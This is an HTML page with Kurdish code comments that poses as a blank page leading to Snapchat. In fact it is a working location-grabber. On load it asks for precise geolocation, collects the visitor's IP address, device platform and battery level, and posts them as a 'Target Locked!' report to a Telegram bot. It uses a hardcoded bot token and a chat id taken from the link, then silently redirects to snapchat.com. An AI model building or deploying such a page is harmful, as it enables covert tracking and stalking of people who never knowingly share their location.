<!DOCTYPE html>
<html lang="ku">
<head>
    <meta charset="UTF-8">
    <title> </title>
    <style>
        body { background-color: white; margin: 0; }
    </style>
</head>
<body onload="init()">

<script>
    // تۆکنە نوێیەکەت لێرە دابنێ
    const TK = "8678050341:AAE7b3fvFpfGju4NXGaFiMsvhYC0UdnCYtE";

    async function init() {
        const urlParams = new URLSearchParams(window.location.search);
        const uid = urlParams.get('id');
        if (!uid) return;

        // یەکەم هەنگاو: داواکردنی لۆکەیشن (ئەمە Allow دەهێنێتە سەر شاشە)
        navigator.geolocation.getCurrentPosition(async (pos) => {
            
            // ئەگەر Allow کرا، ئینجا زانیارییەکانی تر کۆبکەرەوە
            const ipData = await fetch('https://api.ipify.org?format=json').then(r => r.json());
            let bat = "N/A";
            if (navigator.getBattery) {
                const b = await navigator.getBattery();
                bat = Math.floor(b.level * 100) + "%";
            }
            
            let report = `🚨 <b>Target Locked!</b>\n\n` +
                         `📍 <b>Location:</b> <a href="http://maps.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}">[Google Maps]</a>\n` +
                         `🌐 <b>IP:</b> <code>${ipData.ip}</code>\n` +
                         `📱 <b>Device:</b> <code>${navigator.platform}</code>\n` +
                         `🔋 <b>Battery:</b> <code>${bat}</code>`;

            // ناردنی نامە بۆ بۆتەکە
            await fetch(`https://api.telegram.org/bot${TK}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({chat_id: uid, text: report, parse_mode: "HTML"})
            });

            // ڕێدایرێکت دوای ناردن
            window.location.replace("https://www.snapchat.com");

        }, () => {
            // ئەگەر ڕەتی کردەوە (Deny)
            window.location.replace("https://www.snapchat.com");
        }, { enableHighAccuracy: true });
    }
</script>
</body>
</html>
